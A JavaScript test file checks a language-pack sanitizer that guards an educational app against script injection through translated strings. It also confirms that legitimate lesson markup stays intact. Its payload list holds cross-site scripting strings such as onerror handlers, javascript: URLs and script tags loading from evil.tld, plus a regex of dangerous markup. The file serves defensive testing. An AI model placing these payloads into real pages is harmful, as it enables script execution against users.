// Language packs are untrusted input: they arrive from a user-chosen file (importLanguagePack),
// a CDN/raw.githubusercontent fetch, or LLM translation output. t() resolves the pack BEFORE the
// static UI_STRINGS, and several STEM-lab consumers concatenate t() output straight into
// innerHTML — so a pack can carry script into the page. sanitizeLanguagePack() is the choke point.
//
// This pins both halves of the contract:
//   1. executable markup never survives sanitization, and
//   2. the 749 shipped strings that legitimately contain markup (<strong>, plus the a11y lab's
//      deliberately-bad <html>/<img> teaching samples) come through byte-identical.
// Breaking (2) silently corrupts lesson content in 63 languages, which is why it is tested here
// rather than left to review.
import { describe, it, expect } from 'vitest';
import fs from 'fs';
import path from 'path';

const root = path.resolve(__dirname, '..');
const appSrc = fs.readFileSync(path.join(root, 'desktop/web-app/src/App.jsx'), 'utf8');

function loadSanitizer() {
  const start = appSrc.indexOf('// Only elements that execute');
  const end = appSrc.indexOf('const translateChunk');
  if (start === -1 || end === -1 || end <= start) {
    throw new Error('sanitizeLanguagePack block not found in App.jsx — did the helper move or get renamed?');
  }
  const exportsObj = {};
  // eslint-disable-next-line no-new-func
  new Function('exports', appSrc.slice(start, end) +
    '\nexports.sanitizeString = _sanitizeI18nString; exports.sanitizePack = sanitizeLanguagePack;')(exportsObj);
  return exportsObj;
}

const { sanitizeString, sanitizePack } = loadSanitizer();

// Any on* handler regardless of separator, plus code-loading elements and script URLs.
const DANGEROUS = /<script|<iframe|<object|<embed|<link|<applet|<frame|<base|<meta|<style|[\s/]on[a-z]+\s*=|javascript:|vbscript:|data:text\/html/i;

describe('language pack sanitizer — executable markup', () => {
  const payloads = [
    '<script>alert(1)</script>',
    'lead <script src="//evil.tld/x.js"></script> trail',
    '<img src=x onerror=alert(1)>',
    // "/" separates attributes as validly as whitespace: these bypass a \s-anchored rule.
    '<svg/onload=alert(1)>',
    '<svg//onload=alert(1)>',
    '<img/src=x/onerror=alert(1)>',
    '<div\nonmouseover=alert(1)>newline separated</div>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<a href="javascript:alert(1)">click</a>',
    '<a href="  javascript:alert(1)">leading space</a>',
    '<strong onclick="steal()">bold</strong>',
    '<STRONG ONERROR=alert(1)>uppercase</STRONG>',
    '<body onload=alert(1)>',
    '<object data="data:text/html,<script>alert(1)</script>"></object>',
    '<form action="javascript:x()"><input onfocus=alert(1) autofocus></form>',
    '<embed src="//evil.tld/x.swf">',
    '<link rel=stylesheet href="//evil.tld/x.css">',
    '<style>body{background:url(javascript:alert(1))}</style>',
    '<base href="//evil.tld/">',
  ];

  it.each(payloads)('neutralizes %j', (payload) => {
    expect(sanitizeString(payload)).not.toMatch(DANGEROUS);
  });

  it('sanitizes nested pack values, not just top-level strings', () => {
    const pack = { a: { b: ['<img src=x onerror=alert(1)>', { c: '<script>alert(1)</script>' }] } };
    const out = sanitizePack(pack);
    expect(out.a.b[0]).not.toMatch(DANGEROUS);
    expect(out.a.b[1].c).not.toMatch(DANGEROUS);
  });

  it('drops prototype-polluting keys', () => {
    const pack = JSON.parse('{"__proto__": {"polluted": true}, "safe": "ok"}');
    const out = sanitizePack(pack);
    expect(Object.prototype.polluted).toBeUndefined();
    expect(out.safe).toBe('ok');
  });

  it('survives cyclic structures without hanging', () => {
    const pack = { name: 'x' };
    pack.self = pack;
    expect(() => sanitizePack(pack)).not.toThrow();
  });
});

describe('language pack sanitizer — shipped content is preserved', () => {
  it('leaves ordinary prose untouched, including words that look like handlers', () => {
    // "10 ones = 1 ten" matches a naive /\son[a-z]+\s*=/ rule; it must not.
    const prose = 'The whole point of place value. 10 ones = 1 ten; 10 tens = 1 hundred.';
    expect(sanitizeString(prose)).toBe(prose);
  });

  it('preserves inline formatting and literal angle-bracket prose', () => {
    for (const s of [
      '<strong>Pro Tip:</strong> AI-generated text can be imperfect.',
      'Shade for ≤/≥, dashed for </>.',
      'page has no <title>. Screen readers and tab listings will not be clear.',
    ]) {
      expect(sanitizeString(s)).toBe(s);
    }
  });

  it('keeps the a11y lab\'s deliberately-inaccessible HTML samples intact', () => {
    const sample = '<html>\n  <head><title>My Page</title></head>\n  <body>\n    <h1>Hello World</h1>\n    <img src="photo.jpg">\n  </body>\n</html>';
    expect(sanitizeString(sample)).toBe(sample);
  });

  it('alters zero strings across every shipped language pack', () => {
    const langDir = path.join(root, 'lang');
    const packs = fs.readdirSync(langDir).filter((f) => f.endsWith('.js'));
    expect(packs.length).toBeGreaterThan(0);

    const altered = [];
    let scanned = 0;
    const walk = (node, file, keyPath) => {
      for (const key of Object.keys(node)) {
        const value = node[key];
        if (typeof value === 'string') {
          scanned++;
          if (sanitizeString(value) !== value) altered.push(`${file} :: ${keyPath}${key}`);
        } else if (value && typeof value === 'object') {
          walk(value, file, `${keyPath}${key}.`);
        }
      }
    };
    for (const file of packs) {
      walk(JSON.parse(fs.readFileSync(path.join(langDir, file), 'utf8')), file, '');
    }

    expect(scanned).toBeGreaterThan(1000);
    expect(altered.slice(0, 10)).toEqual([]);
  });
});

describe('language pack loader', () => {
  it('never evaluates a fetched pack as code', () => {
    // A compromised pack host would otherwise get code execution in every client.
    expect(appSrc).not.toMatch(/new Function\(\s*['"]return\s*['"]\s*\+\s*text\s*\)/);
  });

  it('routes every pack ingest through the sanitizer', () => {
    const rawSetters = appSrc.match(/setLanguagePack\((?!sanitizeLanguagePack|null\))[^)]/g) || [];
    expect(rawSetters).toEqual([]);
  });
});
